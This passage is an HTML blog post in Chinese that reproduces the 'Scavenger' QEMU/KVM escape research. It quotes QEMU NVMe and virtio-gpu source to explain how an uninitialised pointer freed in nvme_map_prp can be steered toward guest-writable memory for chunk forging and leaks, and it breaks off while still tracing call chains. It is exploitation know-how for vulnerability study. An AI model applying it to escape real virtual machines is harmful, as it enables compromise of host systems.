@@ -1,0 +1,725 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/four.jpg">
+  <link rel="icon" href="/img/four.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xtxtn">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="这里复现《Scavenger：Misuse Error Handling Leading To QEMU&#x2F;KVM Escape》，虽然没有CVE，但也是确确实实存在过可以利用的漏洞。 具体参考：https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;373084566  、 https:&#x2F;&#x2F;github.com&#x2F;hustdebug&#x2F;scavenger 漏洞分析漏洞函数在nvme_map">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Misuse Error Handling Leading To QEMU&#x2F;KVM Escape">
+<meta property="og:url" content="https://xtxtn.github.io/2023/10/12/ErrorHandling/index.html">
+<meta property="og:site_name" content="xtxtn&#39;s Blog">
+<meta property="og:description" content="这里复现《Scavenger：Misuse Error Handling Leading To QEMU&#x2F;KVM Escape》，虽然没有CVE，但也是确确实实存在过可以利用的漏洞。 具体参考：https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;373084566  、 https:&#x2F;&#x2F;github.com&#x2F;hustdebug&#x2F;scavenger 漏洞分析漏洞函数在nvme_map">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xtxtn.github.io/img/22/Screenshot%202023-10-18%20152610.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/22/Screenshot%202023-10-18%20123922.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/22/Screenshot%202023-10-18%20135401.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/22/Screenshot%202023-10-18%20135521.png">
+<meta property="og:image" content="https://xtxtn.github.io/img/22/Screenshot%202023-10-18%20214923.png">
+<meta property="article:published_time" content="2023-10-12T05:24:33.952Z">
+<meta property="article:modified_time" content="2023-10-18T16:03:41.925Z">
+<meta property="article:author" content="xtxtn">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xtxtn.github.io/img/22/Screenshot%202023-10-18%20152610.png">
+  
+  
+  
+  <title>Misuse Error Handling Leading To QEMU/KVM Escape - xtxtn&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xtxtn.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xtxtn</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/th.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Misuse Error Handling Leading To QEMU/KVM Escape"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-10-12 13:24" pubdate>
+          2023年10月12日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          32k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          268 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Misuse Error Handling Leading To QEMU/KVM Escape</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>这里复现《Scavenger：Misuse Error Handling Leading To QEMU&#x2F;KVM Escape》，虽然没有CVE，但也是确确实实存在过可以利用的漏洞。</p>
+<p>具体参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/373084566">https://zhuanlan.zhihu.com/p/373084566</a>  、 <a target="_blank" rel="noopener" href="https://github.com/hustdebug/scavenger">https://github.com/hustdebug/scavenger</a></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞函数"><a href="#漏洞函数" class="headerlink" title="漏洞函数"></a>漏洞函数</h3><p>在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/qemu/v4.2.1/source/hw/block/nvme.c#L141">nvme_map_prp函数</a>中运行到pci_dma_sglist_init 有<code>qsg-&gt;sg = g_malloc(alloc_hint * sizeof(ScatterGatherEntry))</code>，为qsg-&gt;sg分配一个堆地址；接着运行到<code>if (unlikely(!prp2))</code>时，prp2为0，通过判断直接跳转到unmap去执行qemu_sglist_destroy函数， qemu_sglist_destroy函数中有<code>g_free(qsg-&gt;sg)</code>释放堆内存。但是运行到的是qemu_iovec_init函数，qsg-&gt;sg中就是一个未初始化的值，接着跳转到unmap去执行qemu_sglist_destroy函数也会释放这个未初始化的值，如果这个未初始化的值是一块可供虚拟机直接读写的内存地址就可以对漏洞进一步利用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_map_prp</span><span class="hljs-params">(QEMUSGList *qsg, QEMUIOVector *iov, <span class="hljs-type">uint64_t</span> prp1,</span><br><span class="hljs-params">                             <span class="hljs-type">uint64_t</span> prp2, <span class="hljs-type">uint32_t</span> len, NvmeCtrl *n)</span><br>&#123;<br>    hwaddr trans_len = n-&gt;page_size - (prp1 % n-&gt;page_size);<br>    trans_len = MIN(len, trans_len);<br>    <span class="hljs-type">int</span> num_prps = (len &gt;&gt; n-&gt;page_bits) + <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (unlikely(!prp1)) &#123;<br>        trace_nvme_err_invalid_prp();<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n-&gt;cmbsz &amp;&amp; prp1 &gt;= n-&gt;ctrl_mem.addr &amp;&amp;<br>               prp1 &lt; n-&gt;ctrl_mem.addr + int128_get64(n-&gt;ctrl_mem.size)) &#123;<br>        qsg-&gt;nsg = <span class="hljs-number">0</span>;<br>        qemu_iovec_init(iov, num_prps);<br>        qemu_iovec_add(iov, (<span class="hljs-type">void</span> *)&amp;n-&gt;cmbuf[prp1 - n-&gt;ctrl_mem.addr], trans_len);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        pci_dma_sglist_init(qsg, &amp;n-&gt;parent_obj, num_prps);<br>        qemu_sglist_add(qsg, prp1, trans_len);<br>    &#125;<br>    len -= trans_len;<br>    <span class="hljs-keyword">if</span> (len) &#123;<br>        <span class="hljs-keyword">if</span> (unlikely(!prp2)) &#123;<br>            trace_nvme_err_invalid_prp2_missing();<br>            <span class="hljs-keyword">goto</span> unmap;<br>        &#125;<br>        ………………<br>        ………………<br>        <br>    &#125;<br>    <span class="hljs-keyword">return</span> NVME_SUCCESS;<br><br> unmap:<br>    qemu_sglist_destroy(qsg);<br>    <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">qemu_sglist_destroy</span><span class="hljs-params">(QEMUSGList *qsg)</span><br>&#123;<br>    object_unref(OBJECT(qsg-&gt;dev));<br>    g_free(qsg-&gt;sg);<br>    <span class="hljs-built_in">memset</span>(qsg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(*qsg));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>接下来就完全参考Gaoning大佬的思路做出的分析，建议直接看开头推荐的链接，自己这里写这篇文章纯粹是怕自己遗忘。</p>
+<h3 id="确定上层函数"><a href="#确定上层函数" class="headerlink" title="确定上层函数"></a>确定上层函数</h3><p>nvme_map_prp的上层调用有三个函数：nvme_dma_write_prp、nvme_dma_read_prp和nvme_rw。</p>
+<p>nvme_dma_write_prp和nvme_dma_read_prp中的qsg都是栈上的变量，存在于栈上的数据导致无法去控制qsg-&gt;sg中的未初始化变量</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_dma_write_prp</span><span class="hljs-params">(NvmeCtrl *n, <span class="hljs-type">uint8_t</span> *ptr, <span class="hljs-type">uint32_t</span> len,</span><br><span class="hljs-params">                                   <span class="hljs-type">uint64_t</span> prp1, <span class="hljs-type">uint64_t</span> prp2)</span><br>&#123;<br>	………………<br>    ………………<br>    <span class="hljs-keyword">if</span> (nvme_map_prp(&amp;qsg, &amp;iov, prp1, prp2, len, n)) &#123;<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125;<br>	………………<br>    ………………<br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后的nvme_rw中的qsg就是存在于堆上的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nvme_process_sq</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque)</span><br>&#123;<br>	………………<br>    ………………<br>    <span class="hljs-keyword">while</span> (!(nvme_sq_empty(sq) || QTAILQ_EMPTY(&amp;sq-&gt;req_list))) &#123;<br>        addr = sq-&gt;dma_addr + sq-&gt;head * n-&gt;sqe_size;<br>        nvme_addr_read(n, addr, (<span class="hljs-type">void</span> *)&amp;cmd, <span class="hljs-keyword">sizeof</span>(cmd));<br>        nvme_inc_sq_head(sq);<br><br>        req = QTAILQ_FIRST(&amp;sq-&gt;req_list);<br>        QTAILQ_REMOVE(&amp;sq-&gt;req_list, req, entry);<br>        QTAILQ_INSERT_TAIL(&amp;sq-&gt;out_req_list, req, entry);<br>        <span class="hljs-built_in">memset</span>(&amp;req-&gt;cqe, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req-&gt;cqe));<br>        req-&gt;cqe.cid = cmd.cid;<br><br>        status = sq-&gt;sqid ? nvme_io_cmd(n, &amp;cmd, req) :<br>            nvme_admin_cmd(n, &amp;cmd, req);<br>	………………<br>    ………………<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_io_cmd</span><span class="hljs-params">(NvmeCtrl *n, NvmeCmd *cmd, NvmeRequest *req)</span><br>&#123;<br>	………………<br>    ………………<br>    <span class="hljs-keyword">case</span> NVME_CMD_READ:<br>        <span class="hljs-keyword">return</span> nvme_rw(n, ns, cmd, req);<br>    <span class="hljs-keyword">default</span>:<br>        trace_nvme_err_invalid_opc(cmd-&gt;opcode);<br>        <span class="hljs-keyword">return</span> NVME_INVALID_OPCODE | NVME_DNR;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint16_t</span> <span class="hljs-title function_">nvme_rw</span><span class="hljs-params">(NvmeCtrl *n, NvmeNamespace *ns, NvmeCmd *cmd,</span><br><span class="hljs-params">    NvmeRequest *req)</span><br>&#123;<br>	………………<br>    ………………<br>    <span class="hljs-keyword">if</span> (nvme_map_prp(&amp;req-&gt;qsg, &amp;req-&gt;iov, prp1, prp2, data_size, n)) &#123;<br>        block_acct_invalid(blk_get_stats(n-&gt;conf.blk), acct);<br>        <span class="hljs-keyword">return</span> NVME_INVALID_FIELD | NVME_DNR;<br>    &#125;<br>	………………<br>    ………………<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="跨域攻击"><a href="#跨域攻击" class="headerlink" title="跨域攻击"></a>跨域攻击</h3><p>virtio_gpu_create_mapping_iov函数中dma_memory_map将虚拟机物理内存映射qemu中的分配给虚拟机真实内存，(*iov)[i].iov_base中的地址就是分配给虚拟机的地址，虚拟机可以直接对其读写</p>
+<img src="/img/22/Screenshot 2023-10-18 152610.png" srcset="/img/loading.gif" lazyload style="zoom:80%;" />
+
+<p>在*iov释放后，接着被qsg申请，利用残留的地址，使用上面的漏洞去释放该内存，在虚拟机中可以直接对该内存读写，就可以很方便地去伪造chunk、泄漏信息，仅仅通过在虚拟机中的读写内存，进而跨域影响到qemu。</p>
+<h2 id="相关函数的调用"><a href="#相关函数的调用" class="headerlink" title="相关函数的调用"></a>相关函数的调用</h2><p>知道需要使用virtio_gpu_create_mapping_iov函数去设置Mapping Table后，接下来就要搞清楚怎样去调用它。</p>
+<p>当时我尝试自己去找上层调用链，和之前一样最后找到virtio_gpu_ctrl_bh这个底半部（bottom half）函数，通过virtio_gpu_handle_ctrl_cb就可以触发</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_handle_ctrl_cb</span><span class="hljs-params">(VirtIODevice *vdev, VirtQueue *vq)</span><br>&#123;<br>    VirtIOGPU *g = VIRTIO_GPU(vdev);<br>    qemu_bh_schedule(g-&gt;ctrl_bh);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>但是在virtio-gpu.c这个文件中根本就找不到virtio_gpu_handle_ctrl_cb的上层函数，也找不到设备注册的相关函数，当时直接自闭，最后是参考Gaoning大佬的<a target="_blank" rel="noopener" href="https://github.com/hustdebug/scavenger/blob/main/exploit/exp.c">exp</a>中设置的参数才搞明白（事后诸葛🤡）。</p>
+<p>virtio_gpu_device_realize中会调用virtio_gpu_base_device_realize函数，一开始我还以为这个函数跟virtio_gpu_handle_ctrl_cb的调用没多大关系，但是进入virtio_gpu_base_device_realize函数后进一步调用virtio_add_queue函数，在virtio_add_queue函数中会将virtio_gpu_handle_ctrl_cb函数的地址赋值给<code>vdev-&gt;vq[i].handle_output</code>，也就是后续virtio_gpu_handle_ctrl_cb的调用可以通过<code>vdev-&gt;vq[i].handle_output</code>去触发。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_gpu_device_realize</span><span class="hljs-params">(DeviceState *qdev, Error **errp)</span><br>&#123;<br>	………………<br>    ………………<br><br>    <span class="hljs-keyword">if</span> (!virtio_gpu_base_device_realize(qdev,<br>                                        virtio_gpu_handle_ctrl_cb,<br>                                        virtio_gpu_handle_cursor_cb,<br>                                        errp)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    g-&gt;ctrl_vq = virtio_get_queue(vdev, <span class="hljs-number">0</span>);<br>    g-&gt;cursor_vq = virtio_get_queue(vdev, <span class="hljs-number">1</span>);<br>    g-&gt;ctrl_bh = qemu_bh_new(virtio_gpu_ctrl_bh, g);<br>    g-&gt;cursor_bh = qemu_bh_new(virtio_gpu_cursor_bh, g);<br>    QTAILQ_INIT(&amp;g-&gt;reslist);<br>    QTAILQ_INIT(&amp;g-&gt;cmdq);<br>    QTAILQ_INIT(&amp;g-&gt;fenceq);<br>&#125;<br><br><span class="hljs-type">bool</span><br><span class="hljs-title function_">virtio_gpu_base_device_realize</span><span class="hljs-params">(DeviceState *qdev,</span><br><span class="hljs-params">                               VirtIOHandleOutput ctrl_cb,</span><br><span class="hljs-params">                               VirtIOHandleOutput cursor_cb,</span><br><span class="hljs-params">                               Error **errp)</span><br>&#123;<br>	………………<br>    ………………<br>    <span class="hljs-keyword">if</span> (virtio_gpu_virgl_enabled(g-&gt;conf)) &#123;<br>        <span class="hljs-comment">/* use larger control queue in 3d mode */</span><br>        virtio_add_queue(vdev, <span class="hljs-number">256</span>, ctrl_cb);<br>        virtio_add_queue(vdev, <span class="hljs-number">16</span>, cursor_cb);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        virtio_add_queue(vdev, <span class="hljs-number">64</span>, ctrl_cb);<br>        virtio_add_queue(vdev, <span class="hljs-number">16</span>, cursor_cb);<br>    &#125;<br>	………………<br>    ………………<br><br>&#125;<br><br>VirtQueue *<span class="hljs-title function_">virtio_add_queue</span><span class="hljs-params">(VirtIODevice *vdev, <span class="hljs-type">int</span> queue_size,</span><br><span class="hljs-params">                            VirtIOHandleOutput handle_output)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; VIRTIO_QUEUE_MAX; i++) &#123;<br>        <span class="hljs-keyword">if</span> (vdev-&gt;vq[i].vring.num == <span class="hljs-number">0</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (i == VIRTIO_QUEUE_MAX || queue_size &gt; VIRTQUEUE_MAX_SIZE)<br>        <span class="hljs-built_in">abort</span>();<br><br>    vdev-&gt;vq[i].vring.num = queue_size;<br>    vdev-&gt;vq[i].vring.num_default = queue_size;<br>    vdev-&gt;vq[i].vring.align = VIRTIO_PCI_VRING_ALIGN;<br>    vdev-&gt;vq[i].handle_output = handle_output;<br>    vdev-&gt;vq[i].handle_aio_output = <span class="hljs-literal">NULL</span>;<br>    vdev-&gt;vq[i].used_elems = g_malloc0(<span class="hljs-keyword">sizeof</span>(VirtQueueElement) *<br>                                       queue_size);<br><br>    <span class="hljs-keyword">return</span> &amp;vdev-&gt;vq[i];<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在hw&#x2F;virtio&#x2F;virtio-pci.c中的virtio_pci_notify_write函数调用virtio_queue_notify，接着调用<code>vq-&gt;handle_output(vdev, vq)</code>就可以进入virtio_gpu_handle_ctrl_cb函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">virtio_pci_notify_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr,</span><br><span class="hljs-params">                                    <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    VirtIODevice *vdev = opaque;<br>    VirtIOPCIProxy *proxy = VIRTIO_PCI(DEVICE(vdev)-&gt;parent_bus-&gt;parent);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-built_in">queue</span> = addr / virtio_pci_queue_mem_mult(proxy);<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">queue</span> &lt; VIRTIO_QUEUE_MAX) &#123;<br>        virtio_queue_notify(vdev, <span class="hljs-built_in">queue</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">virtio_queue_notify</span><span class="hljs-params">(VirtIODevice *vdev, <span class="hljs-type">int</span> n)</span><br>&#123;<br>    VirtQueue *vq = &amp;vdev-&gt;vq[n];<br><br>    <span class="hljs-keyword">if</span> (unlikely(!vq-&gt;vring.desc || vdev-&gt;broken)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    trace_virtio_queue_notify(vdev, vq - vdev-&gt;vq, vq);<br>    <span class="hljs-keyword">if</span> (vq-&gt;host_notifier_enabled) &#123;<br>        event_notifier_set(&amp;vq-&gt;host_notifier);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (vq-&gt;handle_output) &#123;<br>        vq-&gt;handle_output(vdev, vq);<br><br>        <span class="hljs-keyword">if</span> (unlikely(vdev-&gt;start_on_kick)) &#123;<br>            virtio_set_started(vdev, <span class="hljs-literal">true</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在virtio-pci.c中可以很容易去找到设备的注册和读写函数。</p>
+<p>​                                              </p>
+<p>之后进入virtio_gpu_handle_ctrl函数就会调用virtqueue_pop来得到cmd，在virtqueue_pop中进一步调用virtqueue_split_pop</p>
